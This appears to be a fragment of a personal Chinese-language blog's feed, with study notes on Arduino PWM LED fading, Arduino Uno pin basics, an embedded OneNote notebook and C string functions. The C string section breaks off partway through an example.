title="&nbsp;&nbsp;&nbsp;PWM指令和默认频率"></a>&nbsp;&nbsp;&nbsp;PWM指令和默认频率</h2><p>​        Arduino的analogWrite指令可以指挥输出PWM信号，指令格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">analogWrite(端口号，模拟数值)</span><br></pre></td></tr></table></figure><p>其中端口号必须是3、5、6、9、10或11这六个数字端口的其中之一；模拟数值介于0<del>255之间，代表输出介于0</del>5V之间的仿真模拟电压值。</p><p>此外，Arduino微电脑板预设采用1kHz和500Hz两组不同的PWM输出频率，控制电机时，一般采用1kHz频率：</p><ul><li>引脚5、6：约1kHz（由Timer 0系统定时器决定，这是delay()等函数的基准时间，不建议更改）</li><li>引脚3、11（Timer 2）以及9、10（Timer 1）：约500Hz</li></ul><h2 id="nbsp-nbsp-LED接法"><a href="#nbsp-nbsp-LED接法" class="headerlink" title="&nbsp;&nbsp; LED接法"></a>&nbsp;&nbsp; LED接法</h2><p>​        led的工作电压</p><table><thead><tr><th>颜色</th><th>正向电压</th></tr></thead><tbody><tr><td>红色</td><td>1.7V ~ 2.2V</td></tr><tr><td>橙色</td><td>2.0V</td></tr><tr><td>黄色</td><td>2.1V</td></tr><tr><td>绿色</td><td>2.2V</td></tr><tr><td>蓝色</td><td>3.2V ~ 3.8V</td></tr><tr><td>白色</td><td>3.2V ~ 3.8V</td></tr></tbody></table><p>LED的工作电压约2V，但Arduino的输出电压是5V，我们应该在Arduino的输出和LED之间连接一个限流电阻。连接方式有两种。</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210201161918.png" alt="image-20210201161918881" style="zoom:60%;" /><ul><li><p>左边的接法是由微处理器提供负载所需电流，一般称之为<strong>源流</strong>（sourve current）；</p></li><li><p>右边的接法是由电源（Vcc）提供电流，此谓之<strong>替流</strong>（sink current）</p></li></ul><h2 id="nbsp-nbsp-电阻计算"><a href="#nbsp-nbsp-电阻计算" class="headerlink" title="&nbsp;&nbsp; 电阻计算"></a>&nbsp;&nbsp; 电阻计算</h2><p>为计算方便，LED工作电压通常取2V，电流去10mA（注：高亮度LED的工作电压约3V，工作电流约30mA）。</p><hr><hr><h1 id="设计方案"><a href="#设计方案" class="headerlink" title="设计方案"></a>设计方案</h1><p>简简单单设计完成</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210201174319.png" alt="image-20210201174319908" style="zoom:70%;" /><h1 id="材料清单"><a href="#材料清单" class="headerlink" title="材料清单"></a>材料清单</h1><table><thead><tr><th>材料</th><th>数量</th></tr></thead><tbody><tr><td>Arduino Uno板</td><td>1</td></tr><tr><td>面包板</td><td>1</td></tr><tr><td>LED</td><td>3</td></tr><tr><td>1kΩ电阻</td><td>3</td></tr><tr><td>杜邦线</td><td>若干</td></tr></tbody></table><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">const byte LEDS[] &#x3D; &#123;9, 10, 11&#125;;</span><br><span class="line"></span><br><span class="line">void setup()</span><br><span class="line">&#123;</span><br><span class="line">    for (byte i &#x3D; 0; i &lt; sizeof(LEDS); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        pinMode(LEDS[i], OUTPUT);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void loop()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    int a &#x3D; 0;</span><br><span class="line">    for (byte i &#x3D; 0; i &lt; sizeof(LEDS); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        while (a &lt;&#x3D; 255)</span><br><span class="line">        &#123;</span><br><span class="line">            analogWrite(LEDS[i], a++);</span><br><span class="line">            delay(10);</span><br><span class="line">        &#125;</span><br><span class="line">        while (a &gt;&#x3D; 0)</span><br><span class="line">        &#123;</span><br><span class="line">            analogWrite(LEDS[i], a--);</span><br><span class="line">            delay(10);</span><br><span class="line">        &#125;</span><br><span class="line">        delay(50);</span><br><span class="line">    &#125;</span><br><span class="line">    delay(50);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="成果展示"><a href="#成果展示" class="headerlink" title="成果展示"></a>成果展示</h1><p>此视频可以在电脑网页中加载（推荐chrome、Firefox），手机请用Firefox或chrome打开</p><p><video controls name="media" style="zoom:60%;"><source src="https://videos-wujunyi.oss-cn-beijing.aliyuncs.com/VID_20210201_182403.mp4" type="video/mp4"></video></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;设有三个小灯A、B、C 事先处于熄灭状态，接着A 灯开始由暗到亮，再由亮变暗，A 灯熄灭之后B 灯开始由暗变亮，再由亮变暗，B 灯熄灭之后C 灯开始由暗变亮，再由亮变暗，如此循环。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="单片机" scheme="https://wujunyi792.github.io/categories/%E5%8D%95%E7%89%87%E6%9C%BA/"/>
    
    <category term="arduino" scheme="https://wujunyi792.github.io/categories/%E5%8D%95%E7%89%87%E6%9C%BA/arduino/"/>
    
    
    <category term="arduino" scheme="https://wujunyi792.github.io/tags/arduino/"/>
    
  </entry>
  
  <entry>
    <title>Arduino Uno基础知识学习笔记</title>
    <link href="https://wujunyi792.github.io/2021/02/01/Arduino%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/"/>
    <id>https://wujunyi792.github.io/2021/02/01/Arduino%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-02-01T04:27:55.000Z</published>
    <updated>2021-02-01T06:30:43.709Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>已经两年多没碰单片机了，现在正好有空，决定重新开始认真学习一下。</p><p>这一篇Blog主要介绍Arduino和基本元器件的一些基础知识</p></blockquote><a id="more"></a><h2 id="基础信息"><a href="#基础信息" class="headerlink" title="基础信息"></a>基础信息</h2><h5 id="来自arduino官网的介绍："><a href="#来自arduino官网的介绍：" class="headerlink" title="来自arduino官网的介绍："></a>来自arduino官网的介绍：</h5><blockquote><p>Arduino是一个基于易于使用的硬件和软件的开源原型设计平台。 Arduino板能够读取输入 - 传感器上的灯光，按钮上的手指或Twitter消息 - 并将其转换为输出 - 激活电机，打开LED，在线发布内容。您可以通过向板上的微控制器发送一组指令来告诉您的电路板该做什么。为此，您需要使用Arduino编程语言（基于连线）和基于Processing的Arduino软件（IDE）。</p></blockquote><h5 id="在使用中值得注意的是："><a href="#在使用中值得注意的是：" class="headerlink" title="在使用中值得注意的是："></a>在使用中值得注意的是：</h5><ul><li>每个输出引脚最多提供40mA电流</li><li>总输出电流不得超过200mA</li><li>Arduino勿放置在金属板上</li><li>输出引脚<strong>不可</strong>接地</li><li>输入引脚电压<strong>不得</strong>超过3.3V(5V)</li><li><strong>不得</strong>向Vin引脚提供超过12V的电压</li></ul><h2 id="引脚说明"><a href="#引脚说明" class="headerlink" title="引脚说明"></a>引脚说明</h2><p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210201130350.png" alt="img"></p><hr><h3 id="电源"><a href="#电源" class="headerlink" title="电源"></a>电源</h3><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210201130735.png" alt="img" style="zoom:50%;" /><p>Arduino Uno开发板可以使用三种方式供电：</p><ul><li><p>直流电源插孔 -可以使用电源插孔为Arduino开发板供电。电源插孔通常连接到一个适配器。开发板的供电范围可以是5-20V，但制造商建议将其保持在7-12V之间。高于12V时，稳压芯片可能会过热，低于7V可能会供电不足。</p></li><li><p>VIN引脚 - 该引脚用于使用外部电源为Arduino Uno开发板供电。电压应控制在上述提到的范围内。</p></li><li><p>USB电缆 - 连接到计算机时，提供500mA/5V电压。</p></li></ul><p><strong>5v和3v3</strong></p><p>  根据制造商的数据手册，它们提供稳压的5V和3.3v，向外部组件供电。</p><p><strong>GND</strong></p><p>  在Arduino Uno引脚分配图中，可以看到有5个GND引脚，它们都是互连的。</p><p>  GND引脚用于闭合电路回路，并在整个电路中提供一个公共逻辑参考电平。务必确保所有的GND（Arduino、外设和组件）相互连接并且有共同点。</p><p><strong>RESET</strong> - 复位Arduino开发板。</p><p><strong>IOREF</strong> - 该引脚是输入/输出参考。它提供了微控制器工作的参考电压。</p><hr><h3 id="模拟输入"><a href="#模拟输入" class="headerlink" title="模拟输入"></a>模拟输入</h3><p>Arduino Uno有6个模拟引脚，它们作为ADC（模数转换器）使用。</p><p>这些引脚用作模拟输入，但也可用作数字输入或数字输出。</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210201131543.png" alt="img" style="zoom:50%;" /><p>Arduino引脚A0-A5能够读取模拟电压。在Arduino上，ADC具有10位分辨率，这意味着它可以通过1,024个数字电平表示模拟电压。 ADC将电压转换成微处理器可以理解的位。</p><hr><h3 id="数字引脚"><a href="#数字引脚" class="headerlink" title="数字引脚"></a>数字引脚</h3><p>Arduino Uno的引脚0-13用作数字输入/输出引脚。其中，引脚13连接到板载的LED指示灯；引脚3、5、6、9、10、11具有PWM功能。</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210201131736.png" alt="img" style="zoom:50%;" /><p>当数字引脚配置为输入时，电压由外部设备提供。该电压可以在0-5V之间变化，并转换成数字表示（0或1）。为了确定这一点，有2个阈值：</p><ul><li><p>低于0.8v - 视为0</p></li><li><p>高于2.0v - 视为1</p></li></ul><hr><h4 id="关于PWN"><a href="#关于PWN" class="headerlink" title="关于PWN"></a>关于PWN</h4><p>脉宽调制（PWM）是一种调制技术，用于将消息编码为脉冲信号。 PWM由两个关键部分组成：频率和占空比。 PWM频率决定了完成单个周期（周期）所需的时间以及信号从高到低的波动速度。占空比决定信号在总时间段内保持高电平的时间。</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210201132641.png" alt="img" style="zoom:50%;" /><p>以1kHz为例，若脉冲宽度为周期一半（称50%工作周期），就相当于输出高电位的一半电压；10%工作周期，就相当于高电位的十分之一电压。</p><p>PWN的电压输出计算方式如下：</p><p><strong><em>模拟输出电压=脉冲宽度×高电平值</em></strong></p><hr><h3 id="串行通信待补充"><a href="#串行通信待补充" class="headerlink" title="串行通信待补充"></a>串行通信待补充</h3><hr><h2 id="Arduino-IDE"><a href="#Arduino-IDE" class="headerlink" title="Arduino IDE"></a>Arduino IDE</h2><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210201134952.png" alt="image-20210201134952202" style="zoom:100%;" /><p>这是Arduino官方提供的集成开发环境。里面提供了一些示例程序和头文件。</p><p>安装过程略。但值得注意的是，如果购买的是部分国产arduino板，官方驱动可能无法识别到设备，此时需要<strong>安装CH340驱动</strong>。BTW，Mac OS和Linux不需要驱动。</p><p>当然也可以使用vscode进行开发，只需安装如下两个插件即可</p><p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210201142208.png" alt="image-20210201142208117"></p><p>新建一个adruino程序，输入<code>ar</code>+<code>Tab</code>即可自动生成程序基础框架。</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210201142725.png" alt="image-20210201142725275" style="zoom:67%;" /><p>vscode右下角可以设置开发板信息和端口信息</p><p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210201142845.png" alt="image-20210201142845619"></p><p>右上角可以进行编译、上传等操作</p><p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210201142944.png" alt="image-20210201142944084"></p><p><strong>注意：使用前记得将arduino ide路径添加进vscode中arduino设置的path</strong></p><p>参考文章:<br><a href="https://www.yiboard.com/thread-831-1-1.html">引脚分配图及定义</a></p><p><a href="https://cn.heatherforcongress.com/36285-A-Beginners-Guide-to-Arduino-64">Arduino初学者指南</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;已经两年多没碰单片机了，现在正好有空，决定重新开始认真学习一下。&lt;/p&gt;
&lt;p&gt;这一篇Blog主要介绍Arduino和基本元器件的一些基础知识&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="单片机" scheme="https://wujunyi792.github.io/categories/%E5%8D%95%E7%89%87%E6%9C%BA/"/>
    
    <category term="笔记" scheme="https://wujunyi792.github.io/categories/%E5%8D%95%E7%89%87%E6%9C%BA/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="Arduino" scheme="https://wujunyi792.github.io/tags/Arduino/"/>
    
  </entry>
  
  <entry>
    <title>My One Note</title>
    <link href="https://wujunyi792.github.io/2021/01/18/My%20One%20Note/"/>
    <id>https://wujunyi792.github.io/2021/01/18/My%20One%20Note/</id>
    <published>2021-01-18T12:28:47.000Z</published>
    <updated>2021-01-18T12:32:04.330Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>我个人的 Office OneNote 笔记本<br>在手机 app 登陆不方便的时候可以在这里查看</p></blockquote><a id="more"></a><iframe src="https://onedrive.live.com/embed?cid=B7ADC0099E5AB068&resid=B7ADC0099E5AB068%212406&authkey=AEDvCfvTmfbcMZs" width="98" height="120" frameborder="0" scrolling="no"></iframe><p>参考文章:<br><a href="">参考链接</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;我个人的 Office OneNote 笔记本&lt;br&gt;在手机 app 登陆不方便的时候可以在这里查看&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="iframe" scheme="https://wujunyi792.github.io/categories/iframe/"/>
    
    <category term="笔记" scheme="https://wujunyi792.github.io/categories/iframe/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="笔记本" scheme="https://wujunyi792.github.io/tags/%E7%AC%94%E8%AE%B0%E6%9C%AC/"/>
    
    <category term="Microsoft" scheme="https://wujunyi792.github.io/tags/Microsoft/"/>
    
  </entry>
  
  <entry>
    <title>C语言字符串学习笔记</title>
    <link href="https://wujunyi792.github.io/2020/12/23/C%E8%AF%AD%E8%A8%80%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://wujunyi792.github.io/2020/12/23/C%E8%AF%AD%E8%A8%80%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2020-12-23T12:39:39.000Z</published>
    <updated>2020-12-23T13:07:39.518Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>摘要<br>C字符串函数，有必要好好学习，对一些字符串的处理，用正确的函数很重要。</p></blockquote><a id="more"></a><ul><li>获取字符串的长度：strlen 函数</li><li>拷贝字符串：strcpy函数和 strncpy函数</li><li>连接字符串：strcat 函数和 strncat 函数</li><li>比较字符串：strcmp 函数和 strncmp 函数</li></ul><h2 id="strcpy字符串复制"><a href="#strcpy字符串复制" class="headerlink" title="strcpy字符串复制"></a>strcpy字符串复制</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> str1[<span class="number">100</span>] = <span class="string">&quot;Original&quot;</span>;</span><br><span class="line">        <span class="keyword">char</span> str2[<span class="number">10</span>] = <span class="string">&quot;New&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">strcpy</span>(str1, str2);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, str1);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果应该是只打印 New 这个字符串。可能会觉得 str1 的长度比 str2 长，调用 strcpy 函数后会只覆盖前边的内容，后边保留……但事实上并不是这样，因为 strcpy 函数复制 str2 的时候，会将该字符串最后的 ‘\0’ 也一并复制过去。如图：<img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20201223204029.png" alt="image-20201223201312225"></p><h2 id="strncpy字符串复制"><a href="#strncpy字符串复制" class="headerlink" title="strncpy字符串复制"></a>strncpy字符串复制</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> str1[] = <span class="string">&quot;To be or not to be&quot;</span>;</span><br><span class="line">        <span class="keyword">char</span> str2[<span class="number">40</span>];</span><br><span class="line">        <span class="keyword">char</span> str3[<span class="number">40</span>];</span><br><span class="line"></span><br><span class="line">        <span class="built_in">strncpy</span>(str2, str1, <span class="keyword">sizeof</span>(str2));</span><br><span class="line">        <span class="built_in">strncpy</span>(str3, str2, <span class="number">5</span>);</span><br><span class="line">        str3[<span class="number">5</span>] = <span class="string">&#x27;\0&#x27;</span>; <span class="comment">//重要!!!!!!!!!!!!!!!!!!!!</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, str1);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, str2);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, str3);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">To be <span class="keyword">or</span> <span class="keyword">not</span> to be</span><br><span class="line">To be <span class="keyword">or</span> <span class="keyword">not</span> to be</span><br><span class="line">To be</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>含义</th></tr></thead><tbody><tr><td>dest</td><td>指向存放字符串的目标数组</td></tr><tr><td>src</td><td>指向待拷贝的源字符串</td></tr><tr><td>n</td><td>指定拷贝的最大长度</td></tr></tbody></table><p>和 strcpy 函数一样，strncpy(dest, src, n) 函数将拷贝源字符串的 n 个字符到目标数组中。<strong>如果源字符串的长度小于 n，那么就用 ‘\0’ 填充额外的空间</strong>。如果源字符串的长度大于或等于 n，那么只有 n 个字符被拷贝到目标数组中（注意：这样的话将不会以结束符 ‘\0’ 结尾）。</p><p><strong>为了使该函数更“安全”，建议使用 dest[sizeof(dest) - 1] = ‘\0’; 语句确保目标字符串是以 ‘\0’ 结尾.</strong></p><h2 id="sizeof运算符-amp-strlen字符串长度"><a href="#sizeof运算符-amp-strlen字符串长度" class="headerlink" title="sizeof运算符&amp;strlen字符串长度"></a>sizeof运算符&amp;strlen字符串长度</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> str[] = <span class="string">&quot;I love mjclouds.com!&quot;</span>;</span><br><span class="line"></span><br><span class="line">        str[<span class="number">7</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;sizeof str = %d\n&quot;</span>, <span class="keyword">sizeof</span>(str));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;strlen str = %d\n&quot;</span>, <span class="built_in">strlen</span>(str));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该程序输出<code>sizeof str = 21</code> <code>strlen str = 7</code></p><p>sizeof 运算符是取得字符串的尺寸，即该字符串所处存储空间的大小。<br>代码开头的 <code>char str[] = &quot;I love mjclouds.com!&quot; </code>决定了该字符数组的尺寸。而字符串的长度则是由第一个遇到的结束符（’\0’）所定义的。只要编译器读取到结束符<code>\0</code>，它不管你字符数组后边是否有其它内容，都会认为字符串已经结束。</p><h2 id="strcat连接字符串"><a href="#strcat连接字符串" class="headerlink" title="strcat连接字符串"></a>strcat连接字符串</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> str1[<span class="number">100</span>] = <span class="string">&quot;Original String&quot;</span>;</span><br><span class="line">        <span class="keyword">char</span> str2[] = <span class="string">&quot;New String&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">strcat</span>(str1, <span class="string">&quot; &quot;</span>);</span><br><span class="line">        <span class="built_in">strcat</span>(str1, str2);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;str1: %s\n&quot;</span>, str1);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">str1: Original String New String</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>**strcat(dest, src) **</p><table><thead><tr><th>参数</th><th>含义</th></tr></thead><tbody><tr><td>dest</td><td>指向用于存放字符串的目标数组，它应该包含一个字符串，并且提供足够容纳连接后的总字符串长度的空间（包含结束符 ‘\0’）</td></tr><tr><td>scr</td><td>指向待连接的源字符串，该参数不应该与 dest 参数指向的位置发生重叠</td></tr></tbody></table><p>strcat 函数用于连接两个字符串。</p><p>将源字符串拷贝并连接到目标数组存放的字符串后边，此过程将覆盖第一个参数的结束符 ‘\0’。</p><p>两个参数的位置不应该重叠。</p><h2 id="strncat连接字符串"><a href="#strncat连接字符串" class="headerlink" title="strncat连接字符串"></a>strncat连接字符串</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> str1[<span class="number">20</span>] = <span class="string">&quot;I &quot;</span>;</span><br><span class="line">        <span class="keyword">char</span> str2[<span class="number">20</span>] = <span class="string">&quot;love &quot;</span>;</span><br><span class="line">        <span class="keyword">char</span> str3[<span class="number">20</span>] = <span class="string">&quot;FishC.com!&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">strncat</span>(str1, str2, <span class="number">5</span>);</span><br><span class="line">        <span class="built_in">strncat</span>(str1, str3, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;str1: %s\n&quot;</span>, str1);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str1: I love FishC.com!</span><br></pre></td></tr></table></figure><p><strong>strncat(dest, src, n)</strong></p><table><thead><tr><th>参数</th><th>含义</th></tr></thead><tbody><tr><td>dest</td><td>指向用于存放字符串的目标数组，它应该包含一个字符串，并且提供足够容纳连接后的总字符串长度的空间（包含结束符 ‘\0’）</td></tr><tr><td>src</td><td>指向待连接的源字符串，该参数不应该与 dest 参数指向的位置发生重叠</td></tr><tr><td>n</td><td>指定待连接的源字符串的最大长度</td></tr></tbody></table><p>strncat 函数用于拷贝源字符串中的 n 个字符到目标数组的字符串后边，并在末尾添加结束符 ‘\0’。</p><p>如果源字符串的长度小于 n，那么不会像 strncpy 函数那样使用 ‘\0’ 进行填充（但结束符 ‘\0’ 还是有的）。</p><p>另外，目标数组中的原有的字符串并不算在 n 中。</p><h2 id="strcmp-比较字符串-amp-strncmp比较字符串"><a href="#strcmp-比较字符串-amp-strncmp比较字符串" class="headerlink" title="strcmp 比较字符串&amp;strncmp比较字符串"></a>strcmp 比较字符串&amp;strncmp比较字符串</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> str1[<span class="number">10</span>] = <span class="string">&quot;I love FishC.com&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> str2[<span class="number">20</span>] = <span class="string">&quot;I love mjclouds.com&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">strcmp</span>(str1, str2)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;两个字符串完全一致！\n&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;两个字符串不同！\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">strncmp</span>(str1, str2, <span class="number">7</span>)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;两个字符串前7个字符完全一致！\n&quot;</span>);</span><br><span class="line">&#125; <span 